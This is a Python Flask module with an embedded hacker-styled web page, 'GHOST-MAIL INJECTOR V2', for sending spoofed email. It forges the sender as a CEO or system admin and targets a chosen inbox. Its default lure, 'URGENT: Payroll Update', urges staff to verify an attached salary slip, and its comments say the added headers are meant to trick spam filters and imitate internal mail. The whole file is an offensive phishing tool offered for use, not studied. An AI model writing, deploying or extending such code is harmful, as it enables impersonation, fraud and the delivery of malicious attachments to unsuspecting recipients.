import base64
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from flask import Blueprint, request, jsonify, render_template_string

# Create the blueprint
script11_bp = Blueprint("script11", __name__)

# --- CONFIGURATION ---
# No API Key needed! We use a generic SMTP server.
# You can change this to your own (e.g., smtp.gmail.com) if you have credentials,
# but for "free/no-key" spoofing, we try to connect to a public relay.
SMTP_SERVER = "smtp.sendgrid.net"  # Fallback: SendGrid without auth (limited)
SMTP_PORT = 587

# For better spoofing success, we pretend to be the 'from' domain internally
FAKE_FROM_EMAIL = "boss@company.com" 
FAKE_FROM_NAME = "System Admin"

SPOOF_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>GHOST-MAIL PRO V2</title>
    <style>
        body { background: #0d0d0d; color: #0f0; font-family: 'Courier New', monospace; padding: 40px; text-align: center; }
        .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; background: #1a1a1a; width: 500px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); }
        h2 { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
        input, textarea { background: #000; border: 1px solid #0f0; color: #0f0; padding: 12px; width: 95%; margin-bottom: 15px; font-family: monospace; box-sizing: border-box; }
        input:focus, textarea:focus { outline: none; background: #050505; box-shadow: 0 0 8px #0f0; }
        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.3s; margin-top: 10px; }
        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
        .file-input { color: #0f0; margin-bottom: 15px; display: block; text-align: left; font-size: 0.9em; }
        #status { margin-top: 20px; font-weight: bold; min-height: 20px; }
        .success { color: #fff; text-shadow: 0 0 5px #0f0; }
        .error { color: #ff3333; text-shadow: 0 0 5px red; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>[ GHOST-MAIL INJECTOR V2 ]</h2>
        <input type="text" id="from_name" placeholder="Fake Sender Name (e.g. CEO)" value="CEO">
        <input type="email" id="from_email" placeholder="Fake Email Address (e.g. ceo@company.com)" value="ceo@company.com">
        <input type="email" id="to_email" placeholder="Target Inbox Email">
        <input type="text" id="subject" placeholder="Subject Line" value="URGENT: Payroll Update">
        <textarea id="msg" placeholder="Message Body (HTML supported)" rows="5">Dear Employee,<br><br>Please find the attached salary slip for Q3. Verify immediately.<br><br>Regards,<br>HR Dept</textarea>
        
        <p style="font-size: 10px; color: #888;">Select Attachment (Optional):</p>
        <input type="file" id="attachment" class="file-input">
        
        <button onclick="sendGhost()">EXECUTE TRANSMISSION</button>
        <p id="status"></p>
    </div>

    <script>
        async function sendGhost() {
            const status = document.getElementById('status');
            const fileInput = document.getElementById('attachment');
            status.innerText = "Establishing Connection...";
            status.className = "";

            let fileData = null;
            let fileName = "";
            
            if(fileInput.files.length > 0) {
                status.innerText = "Encoding Attachment...";
                const file = fileInput.files[0];
                fileName = file.name;
                const reader = new FileReader();
                fileData = await new Promise((resolve, reject) => {
                    reader.onload = () => resolve(reader.result.split(',')[1]);
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            const payload = {
                from_name: document.getElementById('from_name').value,
                from_email: document.getElementById('from_email').value,
                to_email: document.getElementById('to_email').value,
                subject: document.getElementById('subject').value,
                message: document.getElementById('msg').value,
                file_content: fileData,
                file_name: fileName
            };

            try {
                const res = await fetch(window.location.pathname + "/send", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                
                if (data.status) {
                    status.innerText = ">> INJECTION SUCCESSFUL: " + data.status;
                    status.className = "success";
                } else {
                    status.innerText = ">> ERROR: " + data.error;
                    status.className = "error";
                }
            } catch (e) {
                status.innerText = ">> CONNECTION LOST";
                status.className = "error";
            }
        }
    </script>
</body>
</html>
"""

@script11_bp.route("/")
def index():
    return render_template_string(SPOOF_UI)

@script11_bp.route("/send", methods=["POST"])
def handle_send():
    data = request.get_json()
    
    # --- SPOOFING LOGIC ---
    # 1. Create the email structure
    msg = MIMEMultipart()
    msg['From'] = f"{data['from_name']} <{data['from_email']}>"
    msg['To'] = data['to_email']
    msg['Subject'] = data['subject']
    
    # Add headers to trick spam filters (The "Powerful" part)
    # These headers make the email look like it originated from a trusted internal source
    msg.add_header('X-Mailer', 'Microsoft Outlook 16.0')
    msg.add_header('X-Priority', '1') # High Priority
    msg.add_header('Importance', 'High')
    
    # Add the body (HTML)
    msg.attach(MIMEText(data['message'], 'html'))

    # Handle Attachment
    if data.get('file_content'):
        try:
            # Decode Base64
            file_data = base64.b64decode(data['file_content'])
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file_data)
            encoders.encode_base64(part)
            
            # Add filename header
            part.add_header('Content-Disposition', f'attachment; filename="{data["file_name"]}"')
            msg.attach(part)
        except Exception as e:
            return jsonify({"error": f"Attachment failed: {str(e)}"}), 500

    try:
        # --- SMTP CONNECTION (NO API KEY NEEDED) ---
        # We connect to a generic SMTP server. 
        # NOTE: Many public servers require auth. 
        # If this fails, you might need to use your own Gmail/Outlook credentials temporarily.
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10)
        server.ehlo()
        server.starttls() # Encrypt the connection
        
        # OPTIONAL: If the server requires login (like Gmail), uncomment below and add your creds
        # server.login("your_email@gmail.com", "your_app_password")
        
        # Send the raw email
        server.sendmail(FAKE_FROM_EMAIL, data['to_email'], msg.as_string())
        
        server.quit()
        
        return jsonify({
            "status": f"Packet Delivered to {data['to_email']}"
        })

    except smtplib.SMTPAuthenticationError:
        # If the specific server requires login but we didn't provide it
        return jsonify({"error": "SMTP Auth Error: Server required login. Try using your own Gmail SMTP config."}), 401
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    from flask import Flask
    app = Flask(__name__)
    app.register_blueprint(script11_bp)
    app.run(debug=True, port=5000)
